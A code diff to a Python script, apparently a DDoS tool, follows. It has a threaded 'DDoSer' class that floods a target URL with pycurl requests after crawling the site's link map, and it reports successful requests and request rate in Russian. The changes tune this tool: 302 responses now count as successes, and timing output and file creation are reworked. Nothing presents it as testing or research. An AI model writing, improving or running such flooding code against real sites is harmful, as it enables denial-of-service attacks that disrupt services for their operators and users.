@@ -17,7 +17,7 @@ script_path = os.path.abspath(os.path.dirname(sys.argv[0]))
 
 if not os.path.exists(f'{script_path}/maps/'):
     os.makedirs(f'{script_path}/maps/')
-    
+
 
 def url_grab(full_url):
 
@@ -25,14 +25,15 @@ def url_grab(full_url):
 
         with open(f'{script_path}/maps/{url}', 'r') as f:
             subUrls = f.read().splitlines()
-    else:
 
+    else: 
         subUrls = link_extractor.extractor('http://' + url)
 
-        os.mknod(f'{script_path}/maps/{url}')
         with open(f'{script_path}/maps/{url}', 'w') as f:
             for link in subUrls:
                 print(link.strip(), file=f)
+
+        subUrls = list(subUrls)
 
     print(datetime.now().strftime('[%X] ') + 'Карта сайта получена')
     return subUrls
@@ -51,7 +52,8 @@ class DDoSer(Thread):
         curl.setopt(curl.URL, self.url)
         curl.setopt(curl.WRITEFUNCTION, lambda bytes: len(bytes))
         curl.perform()
-        if curl.getinfo(pycurl.HTTP_CODE) == 200:
+        responseCode = curl.getinfo(pycurl.HTTP_CODE)
+        if responseCode == 200 or responseCode == 302:
             requestCountSuccess += 1
         curl.close()
         requestCountExecuted += 1
@@ -96,10 +98,10 @@ if __name__ == '__main__':
         while requestCountExecuted < requestCount:
             bar.update(requestCountExecuted)
 
-    endTime = time.time() - startTime
-    print(endTime)
-
+    workTime = time.time() - startTime
+    print(
+        f'{datetime.now().strftime("[%X]")} Время выполнения: {workTime}c')
     print(
         f'{datetime.now().strftime("[%X]")} Успешных запросов: {requestCountSuccess}')
     print(
-        f'{datetime.now().strftime("[%X]")} Средняя скорость: {round(requestCountExecuted / endTime, 2)} з/с')
+        f'{datetime.now().strftime("[%X]")} Средняя скорость: {round(requestCountExecuted / workTime, 2)} з/с')
